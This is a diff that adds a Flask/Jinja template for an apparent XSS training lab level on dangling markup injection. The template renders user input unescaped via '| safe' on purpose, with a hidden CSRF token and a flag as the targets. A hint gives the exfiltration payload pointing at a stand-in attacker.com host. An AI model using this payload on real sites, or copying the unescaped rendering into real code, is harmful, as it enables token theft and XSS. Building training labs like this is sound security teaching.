@@ -1,0 +1,112 @@
+{% extends "base.html" %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-12">
+        <div class="mission-header">
+            <i class="bi bi-crosshair me-2"></i>Mission Control
+        </div>
+        <div class="mission-content">
+            <h5 class="mb-3">Level 25: Dangling Markup Injection</h5>
+            <p class="text-secondary small mb-4">
+                Welcome to <strong>Secure Token Viewer</strong>.
+            </p>
+
+            <div class="card mb-4 border-0 bg-light">
+                <div class="card-body p-3">
+                    <h6 class="card-title small text-uppercase text-muted mb-2">Objective</h6>
+                    <p class="mb-0 small">Exfiltrate the hidden CSRF token without executing scripts (CSP block).</p>
+                </div>
+            </div>
+
+            <div class="hint-accordion accordion" id="hintsAccordion">
+                <div class="accordion-item">
+                    <h2 class="accordion-header">
+                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+                            data-bs-target="#hint1">
+                            <i class="bi bi-lightbulb me-2"></i> Hint 1: CSP Limitations
+                        </button>
+                    </h2>
+                    <div id="hint1" class="accordion-collapse collapse" data-bs-parent="#hintsAccordion">
+                        <div class="accordion-body small text-secondary">
+                            A strict Content Security Policy (CSP) might block all inline scripts, making traditional
+                            XSS impossible.
+                        </div>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <h2 class="accordion-header">
+                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+                            data-bs-target="#hint2">
+                            <i class="bi bi-code-slash me-2"></i> Hint 2: Consuming Content
+                        </button>
+                    </h2>
+                    <div id="hint2" class="accordion-collapse collapse" data-bs-parent="#hintsAccordion">
+                        <div class="accordion-body small text-secondary">
+                            If you leave a tag like <code>&lt;img src='...</code> unclosed, the browser might consume
+                            the rest of the page syntax, including secrets effectively "swallowing" them into the URL
+                            attributes.
+                        </div>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <h2 class="accordion-header">
+                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+                            data-bs-target="#hint3">
+                            <i class="bi bi-shield-check me-2"></i> Hint 3: Solution
+                        </button>
+                    </h2>
+                    <div id="hint3" class="accordion-collapse collapse" data-bs-parent="#hintsAccordion">
+                        <div class="accordion-body small text-secondary">
+                            Payload: <code>&lt;img src='//attacker.com?log=</code> (Note the unclosed quote).
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="app-frame p-4">
+            <!-- Level 25: Dangling Markup -->
+            <div class="card border-0 shadow-none mb-4">
+                <div class="card-body">
+                    <h4 class="mb-3">Token Safe</h4>
+
+                    {% if message %}
+                    <div
+                        class="alert {% if xss_detected %}alert-success{% else %}alert-info{% endif %} border-0 d-flex align-items-center mb-4">
+                        <i class="bi {% if xss_detected %}bi-check-circle{% else %}bi-info-circle{% endif %} me-2"></i>
+                        <div>{{ message }}</div>
+                    </div>
+                    {% endif %}
+
+                    <form method="POST" action="{{ url_for('xss_level25') }}">
+                        <div class="mb-3">
+                            <label class="form-label">User Profile Description</label>
+                            <input type="text" class="form-control" name="input" placeholder="Enter description..."
+                                required>
+                        </div>
+                        <button type="submit" class="btn btn-primary">Save Profile</button>
+                    </form>
+
+                    <hr>
+
+                    <div class="mt-4">
+                        <h6>Your Profile:</h6>
+                        <div>
+                            {% if request.method == 'POST' %}
+                            {{ request.form.get('input', '') | safe }}
+                            {% endif %}
+                        </div>
+
+                        <!-- The secret we want to steal is functionally below the injection point in the DOM -->
+                        <div class="mt-3">
+                            <input type="hidden" name="csrf_token" value="super_secret_token_value_12345">
+                            <span class="d-none">Secret: FLAG{d4ngl1ng_m4rkup_m4st3r}</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
